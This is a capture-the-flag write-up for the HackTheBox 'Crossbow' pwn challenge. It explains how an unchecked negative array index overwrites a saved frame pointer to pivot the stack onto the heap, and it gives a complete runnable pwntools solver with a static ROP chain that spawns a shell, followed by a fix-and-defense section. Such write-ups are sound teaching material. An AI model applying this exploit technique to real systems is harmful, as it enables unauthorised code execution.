## Overview

`Crossbow` is an easy HackTheBox **Pwn** challenge. The binary lets you "shoot a target" by
choosing a slot index and writing a message into that slot. The index is never bounds-checked, so a
negative index reaches a **saved frame pointer** on the stack. By overwriting that saved RBP with a
heap buffer you control, the function epilogues pivot the stack onto the heap and run a ROP chain.
The binary is statically linked with no PIE, so every gadget sits at a fixed address — you write
`/bin/sh` into writable memory and call `execve` to pop a shell. Path: bad index → saved-RBP overwrite
→ stack pivot → static ROP `execve("/bin/sh")`.

## The technique

The vulnerable function reads a signed integer index with `scanf("%d%*c")` and **never checks its
range** ([CWE-129](https://cwe.mitre.org/data/definitions/129.html), improper validation of an array
index). It then uses that index into a pointer array that lives on its caller's stack:

```c
scanf("%d%*c", &idx);            // signed, no bounds check
ptr[idx] = calloc(1, 0x80);      // store a fresh heap pointer at an arbitrary stack slot
fgets(ptr[idx], 0x80, stdin);    // fill that heap buffer with 0x80 controlled bytes
```

`ptr` is the address of the caller's 0x20-byte stack buffer. Because the callee's own saved RBP sits
`0x10` bytes below that buffer, the index `-2` makes `ptr[-2]` point **exactly at the callee's saved
frame pointer**. So the freshly `calloc`'d heap pointer `P` is written over the saved RBP, and the
following `fgets` fills `P` (a heap buffer) with our bytes — which become a fake stack.

The pivot rides two `leave` instructions:

- The vulnerable function's `leave` pops the overwritten saved RBP, setting `rbp = P` (the heap buffer).
- The *caller's* `leave; ret` then does `mov rsp, rbp` (so `rsp = P`), `pop rbp`, `ret` — and now
  **RSP points into our heap buffer**. Execution returns into whatever address we placed there.

Fake-stack layout: offset `0x00` is junk (consumed by the final `pop rbp`), and offset `0x08` is the
first ROP gadget.

## Solution

The binary is **statically linked and No-PIE**, so it ships the entire set of gadgets we need at fixed
addresses (`pop rax/rdi/rsi/rdx`, a `syscall`, and a `mov [rdi], rax`) — but it contains **no
`/bin/sh` string**. The chain writes the string into writable memory first, then calls `execve`:

```
pop rax = "/bin/sh\0" ; pop rdi = <bss> ; mov [rdi], rax     ; store "/bin/sh" in bss
pop rdi = <bss> ; pop rsi = 0 ; pop rdx = 0 ; pop rax = 59 ; syscall   ; execve("/bin/sh", 0, 0)
```

One gotcha cost real time: a popular public writeup writes `/bin/sh` to `0x40d1fa`, but in this build
that address is **read-only** (`.rodata`), so the `mov [rdi], rax` faults. Always confirm your scratch
address lands inside a writable `LOAD` segment with `readelf -lW ./crossbow` — the writable segment
here starts at `0x40dfb0`, so bss `0x40e800` works. (The binary was also compiled with
`-fno-stack-protector` overriding `-fstack-protector-strong`, so there is no canary between the buffer
and the saved RBP.)

The full, runnable solver:

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.binary = ELF('./crossbow', checksec=False)

POP_RAX    = 0x00404bc7  # pop rax ; ret
POP_RDI    = 0x0040ac2d  # pop rdi ; ret
MOV_RDIRAX = 0x004020f5  # mov qword [rdi], rax ; ret
POP_RSI    = 0x004069b6  # pop rsi ; ret
POP_RDX    = 0x00401139  # pop rdx ; ret
SYSCALL    = 0x00405346  # syscall ; ret
WRITABLE   = 0x0040e800  # bss, inside the RW LOAD segment (verify with readelf -lW)

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else context.binary.process()

io.recvuntil(b"Select target to shoot: ")
io.sendline(b"-2")                       # ptr[-2] == the callee's own saved RBP
io.recvuntil(b"warcry!!")

rop = b"".join([
    b"A" * 8,                            # +0x00 -> consumed as RBP by the final pop rbp
    p64(POP_RAX), b"/bin/sh\x00",        # rax = "/bin/sh\0"
    p64(POP_RDI), p64(WRITABLE),         # rdi = writable bss
    p64(MOV_RDIRAX),                     # [bss] = "/bin/sh\0"
    p64(POP_RDI), p64(WRITABLE),         # rdi = bss (pathname)
    p64(POP_RSI), p64(0),                # rsi = NULL (argv)
    p64(POP_RDX), p64(0),                # rdx = NULL (envp)
    p64(POP_RAX), p64(59),               # rax = 59 (execve)
    p64(SYSCALL),
])
io.sendline(rop)
io.interactive()
```

Running it against the instance pops a shell as the `ctf` user; `cat flag.txt` returns `HTB{...}`.

## Why it worked

A single unchecked array index is enough for full code execution when the array sits on the stack: a
negative index reaches a **saved frame pointer**, and overwriting a saved RBP with a buffer you control
turns the ordinary two-`leave` epilogue chain into a stack pivot — no overflow, no canary leak, and no
libc needed. Static linking then hands you the whole gadget set at fixed addresses, so "there is no
`/bin/sh` string" is a non-issue: `mov [rdi], rax` into bss plus an `execve` syscall is the canonical
static-binary finisher — which is exactly what the flag teases.

## Fix / defense

- **Bounds-check the index** before using it: `if (idx < 0 || idx >= NSLOTS) reject;`.
- Use an unsigned index type and validate the upper bound, so a negative value can never reach a saved
  frame pointer.
- Compile with the stack protector actually enabled — don't let `-fno-stack-protector` silently
  override `-fstack-protector-strong`. A canary between the buffer and the saved RBP would catch this.
- Build with **PIE + full RELRO** so the gadget and bss addresses are not fixed and predictable.
